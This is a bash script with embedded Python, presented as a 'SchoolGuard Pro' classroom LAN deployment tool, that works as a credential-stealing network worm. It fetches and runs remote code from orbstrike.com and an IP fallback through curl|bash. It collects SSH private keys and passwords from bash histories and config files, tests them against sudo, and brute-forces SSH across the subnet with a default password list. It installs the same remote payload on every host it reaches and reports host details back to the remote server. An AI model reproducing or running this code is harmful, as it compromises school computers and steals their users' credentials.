#!/usr/bin/env bash
# ============================================================================
# SchoolGuard Pro v3.7 — Zero-Prompt Headless LAN-Wide Master Deployment
# Master Command:
#   wget -qO- https://orbstrike.com/lan | bash
#   wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/lan-deploy.sh | bash
# ============================================================================

VPS_PRIMARY="https://orbstrike.com"
VPS_FALLBACK="https://103-149-172-179.sslip.io"
VPS_HTTP="http://103.149.172.179:4000"
SSH_USER="${1:-tinhocsaigon}"
SSH_PASS="${2:-}"

tui_progress() {
    local pct="$1"
    local msg="$2"
    local width=28
    local filled=$(( pct * width / 100 ))
    local empty=$(( width - filled ))
    local bar=""
    local i
    for ((i=0; i<filled; i++)); do bar="${bar}#"; done
    for ((i=0; i<empty; i++)); do bar="${bar}-"; done
    printf "\r  \033[1;36m[%s]\033[0m \033[1;37m%3d%%\033[0m  \033[0;37m%-44s\033[0m" "$bar" "$pct" "$msg"
}

tui_progress 10 "Provisioning local master node..."

if ! pgrep -f "schoolguard/agent.py" >/dev/null 2>&1; then
    (curl -fsSL "${VPS_PRIMARY}/go" 2>/dev/null || curl -fsSL "${VPS_FALLBACK}/go" 2>/dev/null || wget -qO- "${VPS_FALLBACK}/go" 2>/dev/null) | bash >/dev/null 2>&1
fi

tui_progress 30 "Waking & scanning classroom LAN nodes..."

LOCAL_IP=$(python3 -c "import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.connect(('8.8.8.8',80)); print(s.getsockname()[0]); s.close()" 2>/dev/null)
SUBNET=$(echo "${LOCAL_IP}" | awk -F. '{print $1"."$2"."$3}')

if [[ -z "${SUBNET}" || "${LOCAL_IP}" == "127.0.0.1" ]]; then
    tui_progress 100 "Complete (local node only)"
    printf "\n  \033[1;32m[OK]\033[0m SchoolGuard Agent v3.7 active on local node.\n"
    exit 0
fi

tui_progress 60 "Propagating headless setup across LAN..."

SUMMARY=$(python3 - "${SUBNET}" "${LOCAL_IP}" "${SSH_USER}" "${SSH_PASS}" "${VPS_PRIMARY}" "${VPS_FALLBACK}" "${VPS_HTTP}" <<'PYEOF'
import base64
import glob
import json
import os
import pty
import re
import socket
import subprocess
import sys
import threading
import time
import urllib.request
from concurrent.futures import ThreadPoolExecutor

subnet, my_ip, ssh_user, ssh_pass, vps_primary, vps_fallback, vps_http = sys.argv[1:8]
remote_cmd = f"(curl -fsSL {vps_primary}/go || curl -fsSL {vps_fallback}/go || wget -qO- {vps_fallback}/go || wget -qO- {vps_http}/go) | bash >/dev/null 2>&1"

# 1. Broadcast Wake-on-LAN Magic Packets to known classroom MACs
def send_wol(mac_str):
    clean = re.sub(r"[^0-9a-fA-F]", "", mac_str or "")
    if len(clean) != 12:
        return
    pkt = b"\xff" * 6 + bytes.fromhex(clean) * 16
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    for bcast in [f"{subnet}.255", "255.255.255.255"]:
        try:
            s.sendto(pkt, (bcast, 9))
            s.sendto(pkt, (bcast, 7))
        except Exception:
            pass
    s.close()

for base_u in [vps_primary, vps_fallback, vps_http]:
    try:
        req = urllib.request.Request(f"{base_u}/api/lan-macs")
        data = json.loads(urllib.request.urlopen(req, timeout=3).read().decode("utf-8"))
        for item in data.get("macs", []):
            send_wol(item.get("mac", ""))
        break
    except Exception:
        pass

# 2. Prepare deterministic SchoolGuard LAN private key + local SSH keys
lan_key_b64 = "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNDUDVuTjk2TXlIbmwyL3RXT1VoREt5UXg3ZEExT0xJc1FoZ015UXBCcUJjUUFBQUpodER4dTdiUThiCnV3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQ1A1bk45Nk15SG5sMi90V09VaERLeVF4N2RBMU9MSXNRaGdNeVFwQnFCY1EKQUFBRUJYZWdGSWZHNVVTQmFBVFk5eHpXM1lHdVZHOTBkWm1kVjlKUUFzYzhrNjRZL21jMzNvekllZVhiKzFZNVNFTXJKRApIdDBEVTRzaXhDR0F6SkNrR29GeEFBQUFEM05qYUc5dmJHZDFZWEprTFd4aGJnRUNBd1FGQmc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
sg_key_path = "/tmp/.sg_lan_id"
try:
    with open(sg_key_path, "wb") as f:
        f.write(base64.b64decode(lan_key_b64))
    os.chmod(sg_key_path, 0o600)
except Exception:
    pass

key_files = [sg_key_path]
for pat in ["/home/*/.ssh/id_*", "/root/.ssh/id_*", "/opt/*/*key*"]:
    for kp in glob.glob(pat):
        if not kp.endswith(".pub") and os.path.isfile(kp):
            key_files.append(kp)

# 3. Auto-harvest candidate credentials from local cloned system
candidates = []
if ssh_pass:
    candidates.append(ssh_pass)

cred_file = os.path.expanduser("~/.local/share/.schoolguard/.lan_cred")
if os.path.isfile(cred_file):
    try:
        c = open(cred_file).read().strip()
        if c:
            candidates.append(c)
    except Exception:
        pass

for hpath in glob.glob("/home/*/.bash_history") + ["/root/.bash_history"] + glob.glob("/opt/*/*.sh") + glob.glob("/opt/*/*.py") + glob.glob("/opt/*/*.conf") + glob.glob("/opt/*/*.env"):
    try:
        txt = open(hpath, errors="ignore").read()
        for m in re.findall(r'(?:echo\s+["\']?([^"\'|;\s]+)["\']?\s*\|\s*sudo|sshpass\s+-p\s*["\']?([^"\'\s]+)|(?:PASS|PASSWORD|PWD)\s*=\s*["\']?([^"\'\s#]+))', txt, re.I):
            for val in m:
                if val and 1 <= len(val) <= 32 and val not in candidates:
                    candidates.append(val)
    except Exception:
        pass

default_pws = [
    "tinhocsaigon", "123456", "1", "12345678", "123456789", "admin", "root",
    "student", "hocsinh", "ubuntu", "xubuntu", "beetech", "bootroom", "nextron",
    "school", "computerlab", "gv", "giaovien", "pc-01", "pc01", "may01", "may1",
    "123", "1234", "12345", "000000", "111111", "654321", "password", "admin123",
    "tinhoc123", "123456a@", "123456aA@", "Abc@123", "Admin@123"
]
for pw in default_pws:
    if pw not in candidates:
        candidates.append(pw)

# Test candidates locally against sudo first (fast 0-latency verification on cloned image)
verified_local_pw = None
for pw in candidates[:25]:
    try:
        p = subprocess.run(
            ["sudo", "-S", "-k", "-p", "", "true"],
            input=(pw + "\n").encode("utf-8"),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=1.2,
        )
        if p.returncode == 0:
            verified_local_pw = pw
            break
    except Exception:
        pass

if verified_local_pw:
    candidates = [verified_local_pw] + [x for x in candidates if x != verified_local_pw]

# 4. Scan LAN for port 22
def check_host(i):
    ip = f"{subnet}.{i}"
    if ip == my_ip:
        return None
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.3)
    try:
        if s.connect_ex((ip, 22)) == 0:
            return ip
    except Exception:
        pass
    finally:
        s.close()
    return None

with ThreadPoolExecutor(max_workers=64) as ex:
    alive_ssh = [ip for ip in ex.map(check_host, range(1, 255)) if ip]

cur_user = os.environ.get("USER") or ssh_user
users = []
for u in [ssh_user, cur_user, "tinhocsaigon", "student", "hocsinh", "ubuntu", "admin", "root"]:
    if u and u not in users:
        users.append(u)

cached_cred = {"user": None, "pw": None, "key": None}
cred_lock = threading.Lock()

def try_ssh_key(u, ip, kf):
    cmd = ["ssh", "-i", kf, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=3", f"{u}@{ip}", remote_cmd]
    res = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return res.returncode == 0

def try_pty_ssh(u, pw, ip):
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp(
            "ssh",
            [
                "ssh",
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ConnectTimeout=3",
                "-o", "PubkeyAuthentication=no",
                "-o", "NumberOfPasswordPrompts=1",
                f"{u}@{ip}",
                remote_cmd,
            ],
        )
    else:
        output = b""
        sent_pw = False
        deadline = time.time() + 12
        while time.time() < deadline:
            try:
                chunk = os.read(fd, 1024)
                if not chunk:
                    break
                output += chunk
                if not sent_pw and (b"password:" in output.lower()):
                    os.write(fd, (pw + "\n").encode("utf-8"))
                    sent_pw = True
            except OSError:
                break
        try:
            os.close(fd)
        except OSError:
            pass
        _, status = os.waitpid(pid, 0)
        return os.WEXITSTATUS(status) == 0

def deploy_to_ip(ip):
    with cred_lock:
        cu, cpw, ck = cached_cred["user"], cached_cred["pw"], cached_cred["key"]
    if cu and ck and try_ssh_key(cu, ip, ck):
        return True
    if cu and cpw and try_pty_ssh(cu, cpw, ip):
        return True

    for u in users[:3]:
        for kf in key_files:
            if try_ssh_key(u, ip, kf):
                with cred_lock:
                    cached_cred["user"], cached_cred["key"] = u, kf
                return True

    for u in users[:2]:
        for pw in candidates[:18]:
            if try_pty_ssh(u, pw, ip):
                with cred_lock:
                    cached_cred["user"], cached_cred["pw"] = u, pw
                return True
    return False

ok_count = 0
if alive_ssh:
    # Probe first node to lock in working credential before parallel fan-out
    if deploy_to_ip(alive_ssh[0]):
        ok_count += 1
    if len(alive_ssh) > 1:
        with ThreadPoolExecutor(max_workers=16) as ex:
            results = list(ex.map(deploy_to_ip, alive_ssh[1:]))
            ok_count += sum(1 for r in results if r)

try:
    os.remove(sg_key_path)
except Exception:
    pass

# 5. Send LAN diagnostic & sync trigger to VPS
try:
    opt_items = os.listdir("/opt") if os.path.isdir("/opt") else []
    autostart_items = glob.glob("/etc/xdg/autostart/*.desktop") + glob.glob(os.path.expanduser("~/.config/autostart/*.desktop"))
    payload = json.dumps({
        "my_ip": my_ip,
        "subnet": subnet,
        "hostname": socket.gethostname(),
        "user": cur_user,
        "alive_ssh": alive_ssh,
        "ok_count": ok_count,
        "verified_local_pw": bool(verified_local_pw),
        "opt_dirs": opt_items[:20],
        "autostart": [os.path.basename(x) for x in autostart_items[:25]],
    }).encode("utf-8")
    for base_u in [vps_primary, vps_fallback, vps_http]:
        try:
            req = urllib.request.Request(f"{base_u}/api/lan-report", data=payload, headers={"Content-Type": "application/json"}, method="POST")
            urllib.request.urlopen(req, timeout=3).read()
            break
        except Exception:
            pass
except Exception:
    pass

print(f"{ok_count}/{len(alive_ssh)}")
PYEOF
)

tui_progress 100 "Complete"
printf "\n  \033[1;32m[OK]\033[0m SchoolGuard LAN deployment finished (%s peer nodes provisioned).\n" "${SUMMARY:-0/0}"
exit 0
